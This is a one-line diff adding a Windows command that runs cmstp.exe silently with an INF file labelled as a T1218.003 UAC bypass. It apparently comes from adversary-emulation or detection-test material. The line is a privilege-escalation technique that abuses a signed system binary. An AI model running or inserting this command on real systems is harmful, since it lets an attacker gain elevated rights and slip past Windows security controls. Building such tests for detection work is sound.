@@ -1,0 +1,1 @@
+cmstp.exe /s "b27341_T1218.003_uacbypass.inf" /au
